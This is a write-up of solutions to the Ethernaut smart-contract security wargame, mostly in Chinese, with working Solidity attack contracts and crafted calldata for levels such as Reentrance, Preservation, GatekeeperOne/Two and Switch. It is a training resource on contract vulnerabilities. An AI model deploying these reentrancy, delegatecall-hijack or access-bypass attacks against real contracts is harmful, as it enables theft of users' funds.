
Tips to [The Ethernaut](https://ethernaut.openzeppelin.com/) of openzeppelin

# Solution

## [01 - Fallback](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB)
1. 先调contribute, 再给合约地址transfer资金(调用 receive函数)， 就能直接获取ownership, 然后可调withdraw
2. 可调用contribute 每次转一点ether，贡献金额足够大就能变成owner


## [02 - Fallout](https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639)
注释 `/* constructor */` 并不是真的 constructor, 只是一个普通函数，直接调用就能获取ownership，`后一个字母l是数字1`


## [03 - CoinFlip](https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF)
deploy another contract to calculate the result
传入CoinFlip合约地址，部署CoinFlipSlove合约，调用CoinFlipSlove.guess去猜结果
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipSlove {
  uint256 public consecutiveWins;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address coinFlipAddr;

  constructor(address _coinFlipAddr ) {
    consecutiveWins = 0;
    coinFlipAddr = _coinFlipAddr;
  }

  function guess() public returns (bool) {
    require(consecutiveWins <= 3, "enough guesses");

    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 flip = blockValue / FACTOR;
    bool side = flip == 1 ? true : false;

    bool r = CoinFlip(coinFlipAddr).flip(side);

    if (r) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```


## [04 - Telephone](https://ethernaut.openzeppelin.com/level/0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446)
deploy another contract to attack
solitidy 文档也强调声明了不要使用[tx.origin](https://docs.soliditylang.org/en/v0.8.20/security-considerations.html#tx-origin) 来做鉴权
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
  function attack(address _telephoneAddr, address _owner) public {
    Telephone(_telephoneAddr).changeOwner(_owner);
  }
}
```


## [05 - Token](https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)
数值越界问题, transfer 超过msg.sender balance数量的value，msg.sender会出现超大的余额(负值被解析成了uint类型)
```solidity
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```


## [06 - Delegation](https://ethernaut.openzeppelin.com/level/0x73379d8B82Fda494ee59555f333DF7D44483fD58)
[delegatecall](https://solidity-by-example.org/delegatecall/)
When contract A executes delegatecall to contract B, B's code is executed
with contract A's storage, msg.sender and msg.value.
所以，当调用Delegation 执行 pwn() 时，改变的owner并不是Delegate的owner，实际是Delegation的owner
并且，delegatecall时，msg.sender and msg.value 是调用 Delegation 的sender，是实际交易发起者


## [07 - Force](https://ethernaut.openzeppelin.com/level/0xb6c2Ec883DaAac76D8922519E63f875c2ec65575)
不能使用常规transfer方法给 Force address 转ETH，因为合约没有receive 方法， 也没有fallback 方法
但任何地址能被迫接收ETH当一个合约调用 [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) 方法，合约剩余的ETH会被转移到指定地址
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    function attack(address _forceAddr) external {
        selfdestruct(payable(_forceAddr));
    }
    receive() external payable {}
}
```


## [08 - Vault](https://ethernaut.openzeppelin.com/level/0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670)
eth_getStorageAt 能够获取到password的值


## [09 - King](https://ethernaut.openzeppelin.com/level/0x3049C00639E6dfC269ED1451764a046f7aE500c6)
contract 成为king之后，不接受ETH，游戏就会卡在这里，无法继续下去
```solidity
contract KingAttack {
    function attack() external payable {
        require(msg.value == 1 ether, "please send exactly 1 ether");
        // claim throne
        // use call here instead of challenge.transfer because transfer
        // has a gas limit and runs out of gas
        (bool success, ) = payable(address(challenge)).call{value: msg.value}("");
        require(success, "External call failed");
    }

    receive() external payable {
        require(false, "cannot claim my throne!");
    }
}
```


## [10 - Reentrance](https://ethernaut.openzeppelin.com/level/0x3049C00639E6dfC269ED1451764a046f7aE500c6)
仅 solidity 0.8.0版本之前的合约可以进行攻击, 因为 Solidity v0.8.0 引入了 [implicit overflow/underflow check](https://docs.soliditylang.org/en/v0.8.0/080-breaking-changes.html)
还有一个点需注意， Reentrance 若使用 `transfer` 替换 `(bool result,) = msg.sender.call{value:_amount}("");` 也无法攻击， 
因为 `address.transfer() has a gas limit of 2100. Its enough for emitting an event but not enough for victim.withdraw() `
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentranceAttact {
    Reentrance holder;
    uint256 initialAmount;

    constructor(address _holder) public {
        holder = Reentrance(payable(_holder));
    }

    function attack() external payable {
        initialAmount = msg.value; 
        holder.donate{value: initialAmount}(address(this));

        callWithdraw();
    }
    
    receive() external payable {
        callWithdraw();
    }

    function callWithdraw() private {
        uint256 leftover = address(holder).balance;
         bool keepRecursing = leftover > 0;

        if (keepRecursing) {
            uint256 amount = initialAmount > leftover ? leftover : initialAmount;
            holder.withdraw(amount);
        }
    }
}
```
[参考](https://ethereum.stackexchange.com/questions/119737/recreating-a-re-entrancy-attack-but-transaction-failed-reverted-why)


## [11 - Elevator](https://ethernaut.openzeppelin.com/level/0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2)
`isLastFloor` 不能保证是幂等的, 第一次返回 false， 之后返回true
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
  uint8 count;

  function attack(address _elevator) public {
    Elevator(_elevator).goTo(0);
  }

  function isLastFloor(uint) external returns (bool) {
    count++;
    if (count > 1) {
        return true;
    }
    return false;
  }
}
```


## [12 - Privacy](https://ethernaut.openzeppelin.com/level/0x131c3249e115491E83De375171767Af07906eA36)
理解Storage存储，以及数据格式转换
```solidity
  bool public locked = true;   // slot 0
  uint256 public ID = block.timestamp; // slot 1
  uint8 private flattening = 10;  // slot 2
  uint8 private denomination = 255; // slot 2
  uint16 private awkwardness = uint16(block.timestamp); // slot 2
  bytes32[3] private data;  // solt 3 - solt 5

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));  // data[2] - slot 4 bytes16(), 拷贝前16个byte，即可得到key
    locked = false;
  }
```


## [13 - GatekeeperOne](https://ethernaut.openzeppelin.com/level/0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C)
`gateOne`: EOA调用合约调用`GatekeeperThree.enter`
`gateTwo`: 待定
`gateThree`: 8 bytes, bit 64-32-0  
1. 32-16 bit 全位0，保证`uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
2. 低 16bit 是tx.origin的低位，保证`uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)`
3. 高32bit不能全是0，保证`uint32(uint64(_gateKey)) != uint64(_gateKey)`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {

    function attack(address _gatekeeperAddr) public {
        address _origin = tx.origin;
        bytes8 key = bytes8(uint64(uint160(_origin))) & 0xFFFFFFFF0000FFFF;
        bool r = GatekeeperOne(_gatekeeperAddr).enter(key);
        assert(r);
    }

}
```


## [14 - GatekeeperTwo](https://ethernaut.openzeppelin.com/level/0x0C791D1923c738AC8c4ACFD0A60382eE5FF08a23)
`gateOne`: EOA调用合约调用`GatekeeperThree.enter`
`gateTwo`: 需要`extcodesize(caller()) = 0`, 那只能在合约的构造函数里调用该方法
`gateThree`: `bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));`, 按位取反，均不同，异或之后的位均为1
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GateKeeperTwo {
   function enter(bytes8 _gateKey) external returns (bool); 
}

contract GatekeeperTwoAttack {

    constructor(address _gatekeeperAddr) {
       bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
       GateKeeperTwo(_gatekeeperAddr).enter(key);
    }

}
```


## [15 - NaughtCoin](https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F)
`approve`其他账户，调用`transferFrom`可以躲避lockTokens限制


## [16 - Preservation](https://ethernaut.openzeppelin.com/level/0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed)
`delegatecall`是在当前合约的上下文执行代码，改变的是当前合约对应的storage
可以调用`setFirstTime`,传入攻击合约地址，修改`timeZone1Library`为攻击合约地址, 再次调用`setFirstTime`, 在攻击合约中实现owner的覆写
```solidity
interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

// this one will be called by delegatecall
contract PreservationAttackerLib {
    // needs same storage layout as Preservation, i.e.,
    // we want owner at slot index 2
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}

contract PreservationAttacker {
    IPreservation public challenge;
    PreservationAttackerLib public detour;

    constructor(address challengeAddress) {
        challenge = IPreservation(challengeAddress);
        detour = new PreservationAttackerLib();
    }

    function attack() external {
      // 1. change the library address to our evil detour lib
      // this works because their LibraryContract is invoked using delegatecall
      // which executes in challenge contract's context (uses same storage)
      challenge.setFirstTime(uint256(address(detour)));

      // 2. now make challenge contract call setTime function of our detour
      challenge.setFirstTime(0);
    }
}
```


## [17 - Recovery](https://ethernaut.openzeppelin.com/level/0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048)
通过浏览器，查看创建合约的transaction能找到合约地址，或者通过sender和nonce推算合约地址
```
// last 20 bytes of hash of rlp encoding of tx.origin and tx.nonce
keccak256(rlp(senderAddress, nonce))[12:31]
```
调用合约地址的`destroy`转移出合约地址中的ETH


## [18 - MagicNum](https://ethernaut.openzeppelin.com/level/0x2132C7bc11De7A90B87375f282d36100a29f97a9)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

/**
 * In the constructor, creates an extremely simple and small contract. 
 */
contract MagicNumberSolver {
    constructor() {
        assembly {
            mstore(0, 0x602a60005260206000f3)
            return(0x16, 0x0a)
        }
    }
}
```


## [19 - AlienCodex](https://ethernaut.openzeppelin.com/level/0x78e23A3881e385465F19c1a03E2F9fFEBdAD6045)
调用`makeContact`之后，解除限制条件，调用`retract`，`codex.length--`数值越界，变成uint256.max，就能获得所有slot的访问设置权限
storage 
```
slot 0: owner, contact
slot 1: codex.length
// ...
slot keccak(1): codex[0]
slot keccak(1) + 1: codex[1]
slot keccak(1) + 2: codex[2]
slot keccak(1) + 3: codex[3]
slot keccak(1) + 4: codex[4]
// ...
```
定位到codex[0]的slot，index 设置为uint256.max - solt, 就指向slot 0，即owner的地址，可调用`revise`改写owner
```go
// calculate codex[0] location
hash := sha3.NewLegacyKeccak256()
h, _ := hex.DecodeString("0000000000000000000000000000000000000000000000000000000000000001")
hash.Write(h)
sig := hash.Sum(nil)
location := hex.EncodeToString(sig)
fmt.Println(location)
```


## [19 - Shop](https://ethernaut.openzeppelin.com/level/0x691eeA9286124c043B82997201E805646b76351a)
目标很明确: 2次调用`price()`返回不同的值，第一次返回值 > 100, 第二次返回0
难点: `function price() external view returns (uint);` 关键字 view，不能改动storage来区分两次调用，但是可以读sotrage
注意到，`isSold`变量在两次调用间有变化，可以借助它来区分
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint) {
        if (!shop.isSold()) {
            uint p = shop.price() + 1;
            return p;
        } else {
            return 0;
        }
    }

    function buy() public {
        shop.buy();
    }
}
```


## [28 - GatekeeperThree](https://ethernaut.openzeppelin.com/level/0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882)
`gateOne`: EOA调用合约调用`GatekeeperThree.enter`
`gateTwo`: 设置`allowEntrance`, `trick.password`可通过`getStorageAt`获取
`gateThree`: 通过`construct0r`设置owner，owner是合约，不包含`receive`或者`fallback`函数，send就会失败，返回false

## [29 - Switch](https://ethernaut.openzeppelin.com/level/0xb2aBa0e156C905a9FAEc24805a009d99193E3E53)
Switch.sol中`calldatacopy`和`address(this).call(_data)`使用的数据并不相同，函数的`calldata`包含`function selector` + `encode parameter data`, 而`_data`是解析之后的`parameter`.
拷贝68的起始位置， 拷贝 4bytes，正好是`_data`中代表`function selector`的数据, 要求数据为`offSelector`, 但为了达到目标，我们call需要真实调用`turnSwitchOn`，解决这个问题，需要假造`calldata`数据如下
```bash
    // _data is "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"
    
    --> function flipSwitch selector
    30c13ade
    --> offset, now = 96-bytes
    0000000000000000000000000000000000000000000000000000000000000060
    --> extra bytes
    0000000000000000000000000000000000000000000000000000000000000000
    --> Offset 68 (where the check occurs)
    20606e1500000000000000000000000000000000000000000000000000000000
    --> length 4 bytes 
    0000000000000000000000000000000000000000000000000000000000000004
    --> Data (function turnSwitchOn signature)
    76227e1200000000000000000000000000000000000000000000000000000000
```